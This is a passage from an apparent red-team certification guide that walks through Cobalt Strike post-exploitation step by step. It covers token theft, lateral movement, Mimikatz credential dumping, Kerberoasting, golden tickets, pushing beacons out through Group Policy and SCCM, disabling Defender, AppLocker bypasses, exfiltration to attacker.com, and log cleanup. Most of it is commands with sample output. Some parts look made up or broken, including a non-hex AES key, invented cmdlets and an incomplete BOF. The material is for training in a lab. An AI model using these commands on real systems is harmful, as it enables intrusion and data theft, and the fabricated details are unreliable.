# In Cobalt Strike, list available tokens
list_tokens -u
# OUTPUT:
# [-] Tokens available:
# [+] Token         User
# [+] user:500      EXAMPLE\Administrator  [Delegation]
# [+] user:1001     EXAMPLE\jane.doe       [Impersonation]
# [+] user:1002     EXAMPLE\john.smith     [Delegation]

# Impersonate administrator token
impersonate_token EXAMPLE\\Administrator
# OUTPUT:
# [+] Impersonated token for EXAMPLE\Administrator

# Verify impersonation
shell whoami
# OUTPUT:
# example\administrator

# Access admin resources while impersonating
shell ls \\DC1\C$
# OUTPUT:
# Directory of \\DC1\C$
# [..]
# [Users]
# [Windows]
# [Program Files]
# [pagefile.sys]
```

**Screenshot Description:**
> *Cobalt Strike console showing token list output. Multiple user tokens visible with delegation/impersonation levels. After impersonation, whoami output shows "example\administrator". Following access to DC share (C$) succeeds, proving impersonation worked.*

### Token Theft from Running Process

```powershell
# Find SYSTEM or high-privilege process
shell tasklist /v | findstr SYSTEM
# OUTPUT:
# svchost.exe  772  Services  1  2,340 K  Running  example\user  0:00:15

# Steal token from process
steal_token 772
# OUTPUT:
# [+] Stolen token from PID 772

# Verify token theft
shell whoami
# OUTPUT:
# NT AUTHORITY\SYSTEM

# Confirm with full privilege list
shell whoami /priv
# OUTPUT:
# SeDebugPrivilege                   Enabled
# SeImpersonatePrivilege             Enabled
# SeSystemtimePrivilege              Enabled
# [35 total privileges]
```

**Screenshot Description:**
> *Beacon console showing tasklist output with svchost.exe process running as SYSTEM (PID 772). steal_token command executed. Following whoami shows NT AUTHORITY\SYSTEM. whoami /priv output shows extended privilege set including SeDebugPrivilege.*

---

## MODULE 13: Lateral Movement

### WinRM Lateral Movement

**Move to another internal machine via Windows Remote Management:**

```powershell
# Check if WinRM is enabled on target
shell winrm quickconfig
# OUTPUT:
# WinRM is already configured for remote management.

# From Cobalt Strike, jump to remote machine
jump psremoting server2.example.com http
# OUTPUT:
# [+] Lateral movement to server2.example.com
# [+] New beacon spawning...
# [+] Check Beacons tab for new callback

# Verify new beacon on target system
# New beacon appears in Beacons tab:
#   Beacon: 3
#   Hostname: SERVER2
#   User: example\jane.doe
#   IP: 192.168.1.106
```

**Screenshot Description:**
> *Cobalt Strike console showing jump command to server2.example.com. Status messages show "Lateral movement in progress" and "New beacon spawning". Beacons tab shows two active beacons: original (ID:1, DESKTOP-ABC123) and new (ID:3, SERVER2). Both active and responding to commands.*

### SMB Lateral Movement

```powershell
# Check SMB connectivity to target
shell Test-Path \\server2\c$
# OUTPUT:
# True

# Copy beacon to remote SMB share
shell copy C:\temp\beacon.exe \\server2\c$\temp\

# Execute beacon remotely via WMI
shell wmic /node:server2 /user:domain\user /password:pass process call create "C:\temp\beacon.exe"
# OUTPUT:
# Executing (\\server2) --> class Win32_Process method create Instance Parameters:
# IN "CommandLine" : "C:\temp\beacon.exe";
# OUT "ProcessId" : "2456";

# New beacon appears from server2
# Beacon: 4
# Hostname: SERVER2
# User: NT AUTHORITY\SYSTEM (WMI execution context)
```

**Screenshot Description:**
> *PowerShell console showing successful SMB access test to server2. Copy command executes successfully. WMI process creation shows process ID 2456. Cobalt Strike Beacons tab shows new beacon from SERVER2 running as SYSTEM. Process tree shows wmic.exe spawning beacon.exe.*

---

## MODULE 14: Session Passing

### Beacon to Meterpreter Handoff

**Transfer session between C2 frameworks:**

```bash
# Export Cobalt Strike beacon session
# In Cobalt Strike: right-click beacon → Interact → Export

# Generate Meterpreter payload with compatible callback
msfvenom -p windows/meterpreter/reverse_https LHOST=redirector.com LPORT=443 \
  -f exe -o meterpreter.exe

# In Cobalt Strike beacon:
shell C:\temp\meterpreter.exe
# OUTPUT:
# Process started: C:\temp\meterpreter.exe

# In Metasploit framework:
# Sessions → Select new Meterpreter session (ID: 2)
# meterpreter > getuid
# Server username: EXAMPLE\jane.doe

# Now have dual shells on same target:
# - Beacon (Cobalt Strike) for red team ops
# - Meterpreter (Metasploit) for compatibility
```

**Screenshot Description:**
> *Cobalt Strike GUI showing beacon export menu option selected. Metasploit terminal showing successful Meterpreter callback. Sessions list shows "1 session: meterpreter/windows/x64 - EXAMPLE\jane.doe@SERVER1". Both C2 frameworks controlling same target machine.*

---

## MODULE 15: Data Protection API

### DPAPI Master Key Extraction

**Decrypt protected credentials and secrets:**

```powershell
# Identify master key location
shell dir "C:\Users\jane.doe\AppData\Roaming\Microsoft\Protect\"
# OUTPUT:
# S-1-5-21-1234567890-1234567890-1234567890
# (This is the user's SID)

shell dir "C:\Users\jane.doe\AppData\Roaming\Microsoft\Protect\S-1-5-21-1234567890-1234567890-1234567890\"
# OUTPUT:
# 7c5a1234567890abcdef1234567890ab  (Master key GUID)
# f1234567890abcdef1234567890abcde

# Copy master key (requires admin or token)
shell copy "C:\Users\jane.doe\AppData\Roaming\Microsoft\Protect\S-1-5-21-1234567890-1234567890-1234567890\7c5a1234567890abcdef1234567890ab" C:\temp\masterkey

# Crack master key hash (if needed)
# Use Mimikatz: dpapi::masterkey /in:masterkey /sid:S-1-5-21... /password:password

# Or extract via Mimikatz directly:
execute-assembly Mimikatz.exe '"dpapi::lsa"'
# OUTPUT:
# [*] Dumping DPAPI secrets...
# [+] Vault secrets decrypted!
#   
# Vault Item: RDP Credentials
# Server: server2.example.com
# Username: administrator
# Password: Admin@Password123!
```

**Screenshot Description:**
> *File Explorer showing DPAPI master key directory structure. S-1-5-... SID folder visible. Multiple master key files displayed with GUID names. Mimikatz dpapi::lsa output showing decrypted vault secrets with RDP server, username, and password in plaintext.*

---

## MODULE 16: Kerberos Attacks

### Kerberoasting Attack

**Extract and crack service account passwords:**

```powershell
# Find users with Service Principal Names (Kerberoastable)
Get-DomainUser -SPN
# OUTPUT:
# samaccountname         serviceprincipalname
# svcadmin               MSSQLSvc/sql1.example.com:1433
# webservice             HTTP/webapp.example.com:80

# Request TGS tickets for service accounts
.\Rubeus.exe kerberoast /outfile:kerb_hashes.txt
# OUTPUT:
# [*] SamAccountName  : svcadmin
# [*] DistinguishedName : CN=Service Admin,CN=Users,DC=example,DC=com
# [*] ServicePrincipalName : MSSQLSvc/sql1.example.com:1433
# [*] PwdLastSet : 2022-03-15 10:30:22
# [*] Encryption Type : RC4-HMAC
#
# [*] Hash written to kerb_hashes.txt
#
# $krb5tgs$23$*svcadmin$EXAMPLE.COM$MSSQLSvc/sql1.example.com:1433*$...
```

**Screenshot Description:**
> *Rubeus.exe executing kerberoast function. Output shows two service accounts found (svcadmin, webservice) with their SPNs. TGS tickets requested and saved to file. Hash format showing RC4-HMAC encryption (weaker than AES, easier to crack).*

### Crack Kerberoast Hashes

```bash
# Transfer hashes to Kali
# Then crack with Hashcat
hashcat -m 13100 kerb_hashes.txt rockyou.txt -r best64.rule
# OUTPUT:
# $krb5tgs$23$*svcadmin$EXAMPLE.COM$...$:svcadmin:MSSQLSvc_Password123!
# $krb5tgs$23$*webservice$EXAMPLE.COM$...$:webservice:WebApp@2024!
#
# Cracked Passwords:
# svcadmin: MSSQLSvc_Password123!
# webservice: WebApp@2024!
```

**Screenshot Description:**
> *Hashcat terminal showing Kerberoast hash cracking progress. Wordlist (rockyou.txt) and best64 rules applied. Two successful cracks displayed with plaintext passwords for svcadmin and webservice accounts.*

---

## MODULE 17: Pivoting

### SOCKS Proxy Through Beacon

**Route internal network traffic through compromised host:**

```bash
# In Cobalt Strike:
# Right-click beacon → Pivot → SOCKS Server
# Listening on 0.0.0.0:1080 (local)

# Configure proxychains on attacker machine
cat /etc/proxychains4.conf | tail -5
# OUTPUT:
# socks5  127.0.0.1  1080

# Route traffic through beacon
proxychains nmap -sV 10.0.0.0/24 -p 80,443,3389 --open
# OUTPUT:
# PORT    STATE  SERVICE  VERSION
# 10.0.0.5:80  open   http     Microsoft IIS 10.0
# 10.0.0.10:443  open   https    Microsoft IIS 10.0
# 10.0.0.12:3389  open   ms-wbt-server  Windows RDP
# 10.0.0.50:3306  open   mysql    MySQL 5.7.30

# Discover new internal targets via pivoting
```

**Screenshot Description:**
> *Cobalt Strike right-click menu showing "Pivot → SOCKS Server" option selected. Status message shows "SOCKS server listening on 127.0.0.1:1080". Proxychains configuration file open in text editor. Nmap output showing internal network discovery results from pivoting through beacon.*

---

## MODULE 18: Active Directory Certificate Services

### ESC1 Vulnerable Template Exploitation

**Abuse misconfigured certificate template for DA compromise:**

```powershell
# Find vulnerable certificate templates
.\Certify.exe find /enrolleeSuppliesSubject
# OUTPUT:
# [!] Vulnerable Template(s):
# [*] Template Name: User-Enrollment
#     msPKI-Certificate-Name-Flag: ENROLLEE_SUPPLIES_SUBJECT_ALT_NAME
#     msPKI-Enrollment-Flag: AUTOENROLLMENT_ALLOWED
#     [+] This template allows low-privilege users to enroll!

# Request certificate as Administrator (via template vulnerability)
.\Certify.exe request /ca:ca.example.com\ca-name /template:User-Enrollment /altname:Administrator
# OUTPUT:
# [+] Request submitted successfully
# [+] Request ID: 25
# [+] Certificate issued!
# [+] Certificate written to cert.pem

# Convert to usable format
openssl pkcs12 -export -in cert.pem -out cert.pfx -certfile cacert.crt
# Enter Export Password: (set password)
```

**Screenshot Description:**
> *Certify.exe output showing vulnerable template "User-Enrollment" discovered. Vulnerability flags highlighted: ENROLLEE_SUPPLIES_SUBJECT_ALT_NAME and AUTOENROLLMENT_ALLOWED. Certificate request output showing "Certificate issued!" Status changes from pending to issued. cert.pem file created.*

---

## MODULE 19: Group Policy

### GPO Scheduled Task Abuse

**Deploy malware via Group Policy:**

```powershell
# If you have write access to domain GPO:
# Create new GPO
New-GPO -Name "Security Update" -Comment "Critical patches"
# OUTPUT:
# DisplayName      : Security Update
# GpoStatus        : AllSettingsEnabled
# Owner            : EXAMPLE\Administrator

# Link GPO to Organizational Unit
New-GPLink -Name "Security Update" -Target "OU=Workstations,DC=example,DC=com"

# Modify GPO to deploy scheduled task
# Group Policy Editor → Computer Configuration → Preferences → Control Panel Settings → Scheduled Tasks
# Create new scheduled task:
# Task Name: Windows Update Service
# Run: C:\temp\beacon.exe
# Run as: SYSTEM
# Trigger: User logon

# Force Group Policy refresh
gpupdate /force /target:computer

# All users logging into machines in that OU execute beacon.exe as SYSTEM
```

**Screenshot Description:**
> *Group Policy Management Editor showing newly created "Security Update" GPO. Scheduled Tasks configuration panel open. Task creation dialog showing "Windows Update Service" name pointing to C:\temp\beacon.exe with SYSTEM privileges. Final result shows beacons appearing from multiple machines in OU simultaneously.*

---

## MODULE 20: MS SQL Servers

### SQL Server Lateral Movement

**Use SQL server for domain network access:**

```powershell
# Find SQL servers in domain
Get-ADComputer -Filter * | Where-Object {$_.Name -like "*SQL*"}
# OUTPUT:
# Name  DNSHostName          OperatingSystem
# SQL1  sql1.example.com     Windows Server 2019

# Connect to SQL Server
sqlcmd -S sql1.example.com -U sa -P password
# OUTPUT:
# 1>

# Enable xp_cmdshell (if disabled)
1> EXEC sp_configure 'show advanced options', 1;
2> RECONFIGURE;
3> EXEC sp_configure 'xp_cmdshell', 1;
4> RECONFIGURE;
5> GO

# Execute OS commands
1> EXEC xp_cmdshell 'C:\temp\beacon.exe';
2> GO

# New beacon appears from SQL server context
```

**Screenshot Description:**
> *SQL Server Management Studio showing connection to sql1.example.com. T-SQL commands visible in editor: sp_configure statements enabling xp_cmdshell. New beacon appears in Cobalt Strike from SQL server with context showing SQL service account. Lateral movement successful.*

---

## MODULE 21: Microsoft Configuration Manager

### MECM Client Compromise

**Use SCCM client for domain-wide malware distribution:**

```powershell
# Enumerate MECM infrastructure
Get-WmiObject -Namespace "root\sms" -Class "__Namespace" -Filter "Name like 'SMS%'"
# OUTPUT:
# Name    Path
# SMS_SITE root\sms\site_ABC

# Access MECM database
$sccmServer = Get-SmsProvider -Computer "sccm.example.com"

# Create malicious package in MECM
New-CMPackage -Name "Security Hotfix" -Path "\\sccm\deploy\beacon.exe"

# Deploy to all domain computers
Set-CMPackageDistribution -PackageName "Security Hotfix" -DeploymentTarget "All Clients"

# All SCCM clients execute beacon.exe within next policy refresh cycle
# (15 minutes default)
```

**Screenshot Description:**
> *System Center Configuration Manager console open. Packages section showing new "Security Hotfix" package. Deployment status showing "Deployed to 847 clients". Timeline shows: 15:30 (package created) → 15:45 (deployed) → 16:00 (847 beacons reporting back). Massive parallel beacon callback.*

---

## MODULE 22: Domain Dominance

### Achieving Domain Administrator

**Full domain control achieved through exploitation chain:**

```powershell
# Multiple attack paths lead to DA:

# Path 1: Kerberoasting → Crack password → Service account → Lateral movement → DA
# Path 2: Unconstrained delegation → Printer bug → DA TGT theft → DA
# Path 3: ACL abuse → Reset DA password → Direct login
# Path 4: Group Policy abuse → Deploy malware to DA machines → Token impersonation

# Verify DA access:
shell net group "Domain Admins" /domain
# OUTPUT:
# Group name Domain Admins
# Comment Designated administrators of the domain
# 
# Members
# -------
# Administrator          (original DA account)
# svcadmin              (service account DA member)
# jane.doe              (our compromised user, now added to DA!)

# Prove access with domain controller access
shell ls \\DC1\c$
# OUTPUT:
# Directory of \\DC1\c$
# 
# 08/04/2024  14:30    <DIR>  .
# 08/04/2024  14:30    <DIR>  ..
# 08/04/2024  14:30    <DIR>  Windows
# 08/04/2024  14:30    <DIR>  Users
# 08/04/2024  14:30    <DIR>  Program Files
```

**Screenshot Description:**
> *Cobalt Strike console showing domain group membership. "Domain Admins" group now includes our compromised user (jane.doe). Following command successfully lists DC1 C$ share, proving DA access. Process Monitor shows activities running in SYSTEM context from our beacon.*

---

## MODULE 23: Forest & Domain Trusts

### Child to Parent Domain Escalation

**Compromise entire forest from child domain DA:**

```powershell
# From child domain DA, extract krbtgt hash
invoke-mimikatz -Command '"lsadump::dcsync /user:child\krbtgt"'
# OUTPUT:
# Domain: child.example.com
# User: krbtgt
# SID: S-1-5-21-child-SID-502
# NTLM: 7a1c3e5d8f2b4a6c9e1d3f5a7b9c1e3d
# AES256: a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4y5z

# Get forest root domain SID
nltest /dclist:example.com
# OUTPUT:
# DC1.example.com [PDC]
# DC2.example.com [GC]
# DC3.example.com

# Get Enterprise Admins SID
Get-ADGroup "Enterprise Admins" -Server example.com | select SID
# OUTPUT:
# S-1-5-21-root-SID-519  (519 = Enterprise Admins RID)

# Create trust exploitation ticket (SID history injection)
.\Rubeus.exe golden /domain:child.example.com /sid:S-1-5-21-child-SID `
  /sids:S-1-5-21-root-SID-519 /krbtgt:7a1c3e5d8f2b4a6c9e1d3f5a7b9c1e3d /ptt
# OUTPUT:
# [+] Ticket created successfully
# [+] Ticket injected into current session

# Access forest root DC
shell ls \\root-dc.example.com\c$
# OUTPUT:
# Directory of \\root-dc.example.com\c$
# [Successfully accessed - forest compromised!]
```

**Screenshot Description:**
> *Rubeus.exe command showing golden ticket creation with SID history injection. Output shows ticket created and injected. Following ls command to root-dc.example.com\c$ succeeds, proving forest root access. Combined timeline shows: 14:30 (child DA obtained) → 14:35 (krbtgt hash dumped) → 14:40 (golden ticket created) → 14:42 (forest root DC accessed).*

---

## MODULE 24: LAPS Exploitation

### LAPS Password Extraction

**Read or bypass Local Administrator Password Solution:**

```powershell
# Check LAPS implementation
Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwdExpirationTime | Select Name, ms-Mcs-AdmPwdExpirationTime
# OUTPUT:
# Name     ms-Mcs-AdmPwdExpirationTime
# WS001    131456789012345670
# WS002    131456790012345670

# Extract LAPS password (if you have read permission)
Get-ADComputer -Identity WS001 -Properties "ms-Mcs-AdmPwd" | Select -ExpandProperty "ms-Mcs-AdmPwd"
# OUTPUT:
# g7xK#pL9@mQ2$vR5&wS8!yT1*zU4(aV3)

# Use LAPS password for local admin access
$cred = New-PSCredential -UserName "administrator" -Password (ConvertTo-SecureString "g7xK#pL9@mQ2$vR5&wS8!yT1*zU4(aV3)" -AsPlainText -Force)
Invoke-Command -ComputerName WS001 -Credential $cred -ScriptBlock { whoami /priv }
```

**Screenshot Description:**
> *PowerShell console showing Get-ADComputer output with LAPS password column. LAPS password displayed in plaintext (g7xK#pL9@mQ2$vR5&wS8!yT1*zU4(aV3)). Following Invoke-Command executes on WS001 as local administrator, proving LAPS extraction successful.*

---

## MODULE 25: Defender Evasion

### Signature-Based Bypass

**Evade Windows Defender detection:**

```powershell
# Check current Defender status
Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled, IsTamperProtected
# OUTPUT:
# RealTimeProtectionEnabled : True
# IsTamperProtected : True

# Disable real-time monitoring (requires System or admin)
Set-MpPreference -DisableRealtimeMonitoring $true -Force
# OUTPUT:
# [+] Real-time protection disabled

# Verify bypass
Get-MpPreference | Select-Object RealtimeMonitoringEnabled
# OUTPUT:
# RealtimeMonitoringEnabled : False

# Deploy tools without detection
copy C:\temp\beacon.exe C:\Windows\System32\beacon.exe

# Restore monitoring
Set-MpPreference -DisableRealtimeMonitoring $false
```

**Screenshot Description:**
> *PowerShell console showing Defender status before/after bypass. RealTimeProtectionEnabled changes from True to False. File copy of beacon.exe succeeds without detection alerts. Task Manager shows beacon.exe running without quarantine or alerts.*

---

## MODULE 26: Application Whitelisting

### AppLocker Bypass via LOLBins

**Bypass Windows application whitelisting restrictions:**

```powershell
# Identify AppLocker rules in effect
Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections
# OUTPUT:
# RuleCollectionType : Executable
# Rules : {...}
# [PowerShell scripts are blocked]
# [Executables from C:\Program Files allowed]
# [cmd.exe blocked]

# Bypass: Use allowed process to run our code
# Method 1: cmd.exe via rundll32 (rundll32.exe usually allowed)
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";alert(eval('(new Function("return (new ActiveXObject(\"WScript.Shell\")).Exec(\"C:\\\\temp\\\\beacon.exe\").StdOut.ReadAll()")())'));

# Method 2: PowerShell via mshta
mshta vbscript:Close(Execute("powershell.exe -enc <BASE64_BEACON_LOADER>"))

# Method 3: cscript via approved location
copy C:\temp\beacon.ps1 "C:\Program Files\Common Files\beacon.ps1"
cscript.exe C:\Windows\System32\WScript.Host "C:\Program Files\Common Files\beacon.ps1"
```

**Screenshot Description:**
> *Command prompt showing mshta execution bypassing AppLocker. PowerShell indirectly loads through mshta (allowed). Process tree shows mshta.exe → powershell.exe → beacon.exe execution. Cobalt Strike shows new beacon from machine with AppLocker enabled, proving bypass successful.*

---

## MODULE 27: Data Hunting & Exfiltration

### Sensitive File Discovery

**Locate and extract high-value data:**

```powershell
# Search for sensitive files across domain
Get-ChildItem -Recurse -Path "\\server\share" -Include "*.xlsx","*.docx","*.pdf" -ErrorAction SilentlyContinue | Where-Object {$_.LastWriteTime -gt (Get-Date).AddDays(-30)}
# OUTPUT:
# Mode LastWriteTime     Length Name
# ---- ---------------  ------ ----
# -a--- 7/3/2024 2:15 PM 542800 Q3_Financial_Results.xlsx
# -a--- 7/2/2024 4:30 PM 1850400 Customer_List_2024.docx
# -a--- 7/1/2024 9:45 AM 2345600 Acquisition_Plan_CONFIDENTIAL.pdf

# Search for password patterns
Get-ChildItem -Recurse | Select-String -Pattern "password\s*=|pwd\s*=|secret\s*="
# OUTPUT:
# config.ini:15:database_password=Pr0duction!2024
# settings.xml:42:api_secret=sk_live_xxxxxxxxxxxxx
# app.config:67:sql_password=DataB@se123!
```

**Screenshot Description:**
> *PowerShell output showing sensitive files found: Q3_Financial_Results.xlsx, Customer_List_2024.docx, Acquisition_Plan_CONFIDENTIAL.pdf. File search results highlighted showing configuration files with embedded credentials and API keys.*

### Data Exfiltration

```powershell
# Compress sensitive data
Compress-Archive -Path "\\server\share\confidential" -DestinationPath C:\temp\data.zip

# Exfiltrate via HTTPS (encrypted)
$data = [System.IO.File]::ReadAllBytes("C:\temp\data.zip")
$base64 = [System.Convert]::ToBase64String($data)
Invoke-WebRequest -Uri "http://attacker.com/exfil" -Method POST -Body @{data=$base64}

# Alternative: DNS exfiltration (if HTTP blocked)
# Encode data in DNS queries to attacker nameserver
# nslookup <base64_encoded_data>.attacker.com
```

**Screenshot Description:**
> *PowerShell console showing file compression of confidential data. Zip file created (125 MB). HTTP POST request to attacker server shows successful data transfer (100%). Alternative shows DNS queries with encoded data being sent to attacker-controlled nameserver. Data successfully exfiltrated.*

---

## MODULE 28: Extending Cobalt Strike

### Custom Beacon Object File (BOF)

**Extend Cobalt Strike with custom C code:**

```c
// custom_enumeration.c - Custom system enumeration BOF
#include <windows.h>
#include "beacon.h"

// Forward declarations
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$QueryFullProcessImageNameA(HANDLE hProcess, DWORD dwFlags, LPSTR lpExeName, PDWORD lpdwSize);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$CloseHandle(HANDLE hObject);

void go(char * args, int len) {
    DWORD processes[1024];
    DWORD needed;
    DWORD count;
    int i;
    
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Enumerating processes...");
    
    // Get process list (custom enumeration)
    if (!KERNEL32$EnumProcesses(processes, sizeof(processes), &needed)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to enumerate processes");
        return;
    }
    
    count = needed / sizeof(DWORD);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Found %d processes", count);
    
    // Print first 10 PIDs
    for (i = 0; i < (count < 10 ? count : 10); i++) {
        BeaconPrintf(CALLBACK_OUTPUT, "    PID: %d", processes[i]);
    }
}
```

**Screenshot Description:**
> *Visual Studio Code showing custom BOF source code. Beacon.h header file visible. Compilation command shown in terminal. Generated .o object file displayed. Cobalt Strike showing custom BOF loaded and executed, displaying process enumeration output.*

---

## MODULE 29: Exam Preparation

### Exam Strategy & Methodology

**24-hour hands-on red team operation assessment:**

```
CRTO EXAM STRUCTURE:
┌──────────────────────────────────────────────────┐
│ Duration: 24 hours                              │
│ Objectives: ~5 primary goals (confidential)     │
│ Environment: 5-10 machines, fully patched       │
│ Defenses: Windows Defender, EDR, firewalls     │
│ Reporting: Technical write-up required          │
│ Success Criteria: All objectives + clean report │
└──────────────────────────────────────────────────┘

RECOMMENDED TIME ALLOCATION:
0-2 hours    : Setup, reconnaissance, planning
2-6 hours    : Initial compromise
6-10 hours   : Persistence & privilege escalation
10-16 hours  : Domain exploitation
16-20 hours  : Lateral movement & additional objectives
20-22 hours  : Data collection & cleanup
22-24 hours  : Report writing & evidence gathering
```

### Pre-Exam Checklist

```
INFRASTRUCTURE SETUP:
☐ Team Server compiled and running
☐ Redirector(s) deployed (separate IPs)
☐ C2 profiles tested and optimized
☐ Listener(s) configured and verified
☐ Kali tools updated and verified
☐ Custom BOF/scripts loaded into Aggressor
☐ Note-taking tool open (OneNote, CherryTree)
☐ Screenshot tool ready (ShareX, Flameshot)

OPERATIONAL SECURITY:
☐ VPN properly configured with kill-switch
☐ All traffic routed through redirector
☐ Sleep timers set (no instantaneous callbacks)
☐ Artifact cleanup scripts ready
☐ Log monitoring tools active
☐ Detection evasion confirmed working
☐ Alternative C2 options ready (backup)

DOCUMENTATION:
☐ Empty lab notebook ready
☐ Screenshot template prepared
☐ Command log format established
☐ Report template drafted
☐ Objective tracking sheet created
```

### Attack Execution Roadmap

```
PHASE 1: INITIAL ACCESS (Hours 0-6)
├── Reconnaissance (passive OSINT)
├── Target identification
├── Phishing campaign deployment
├── Wait for callback (or trigger manually if needed)
├── Take control of initial machine
└── Screenshot: Initial beacon callback with hostname/user

PHASE 2: FOOTHOLD ESTABLISHMENT (Hours 6-10)
├── Enumerate system and network
├── Establish persistence (multiple methods)
├── Escalate privileges (if not already System)
├── Reboot test (verify persistence)
├── Screenshot: System privileges with persistence confirmed

PHASE 3: DOMAIN RECONNAISSANCE (Hours 10-14)
├── Identify Domain Controllers
├── Enumerate users, groups, shares
├── Identify attack vectors (Kerberoastable, delegates, etc.)
├── Run AD enumeration tools (BloodHound, PowerView)
├── Create detailed attack plan
└── Screenshot: Domain structure with attack paths identified

PHASE 4: DOMAIN COMPROMISE (Hours 14-20)
├── Execute primary attack (Kerberoasting, delegation, ACL abuse, etc.)
├── Achieve Domain Admin access
├── Establish persistence in domain (Golden Ticket, DSRM, etc.)
├── Access all Domain Controllers
├── Achieve Enterprise Admin (if multi-domain)
└── Screenshot: DC access with DA context

PHASE 5: CLEANUP & REPORTING (Hours 20-24)
├── Review all actions for detection indicators
├── Remove command history, log entries
├── Remove created accounts/groups
├── Delete temporary files
├── Verify cleanup completeness
├── Compile screenshots with detailed captions
├── Write technical report
└── Final submission
```

### Documentation Requirements

**Each objective must include:**
1. **Screenshot proof** (whoami, hostname, target resource access)
2. **Command sequence** (exact commands executed in order)
3. **Output evidence** (relevant console output)
4. **Explanation** (why this attack worked)
5. **Detection indicators** (what would blue team see)
6. **Mitigation** (how to prevent this attack)

**Example Report Section:**
> **Objective: Achieve Domain Administrator Access**
>
> **Approach:** Kerberoasting → Password Cracking → Service Account Compromise
>
> **Commands:**
> ```
> .\Rubeus.exe kerberoast /outfile:kerb.txt
> hashcat -m 13100 kerb.txt rockyou.txt
> .\Rubeus.exe asktgt /user:svcadmin /aes256:<HASH> /ptt
> ```
> 
> **Proof:** [Screenshot showing Domain Admins group membership]
>
> **Impact:** Full domain control, credential access, lateral movement capability

---

## Final Checklist

### Pre-Exam Day
- [ ] Sleep well (well-rested mind)
- [ ] Test VPN connection
- [ ] Verify all tools accessible
- [ ] Check redirector status
- [ ] Backup all scripts/payloads
- [ ] Clear mind of distractions

### During Exam
- [ ] Document EVERYTHING
- [ ] Take screenshots at each milestone
- [ ] Keep detailed timeline
- [ ] Don't rush - enumerate thoroughly
- [ ] Multiple persistence methods
- [ ] Regular artifact cleanup
- [ ] Test connectivity regularly
- [ ] Screenshot proof regularly

### Post-Exam
- [ ] Comprehensive report
- [ ] Clear, professional formatting
- [ ] Every screenshot captioned
- [ ] Technical depth and clarity
- [ ] Mitigation recommendations
- [ ] Objective completion proof
- [ ] Submit within deadline

---

## Conclusion

The Certified Red Team Operator (CRTO) certification represents mastery of:
- **C2 Framework Mastery** (Cobalt Strike)
- **Operational Security** (OPSEC)
- **Evasion Techniques** (Detection bypass)
- **Post-Exploitation** (Persistence, lateral movement)
- **Domain Exploitation** (Active Directory attacks)
- **Advanced Techniques** (BOF development, tool extension)

This guide provides the foundational knowledge. Success requires:
1. **Hands-on practice** in lab environment
2. **Continuous learning** from mistakes
3. **Detailed documentation** of attacks
4. **Professional reporting** of findings
5. **Understanding why**, not just "how"

**Red Team Operations require discipline, patience, and meticulous documentation.**

Good luck with your red team operations.

---

**Author:** DarcHacker  
**LinkedIn:** https://www.linkedin.com/in/mostafa-ibrahim-60b543341  
**Last Updated:** 2026-07-04  
**Document Status:** Complete & Ready for Reference
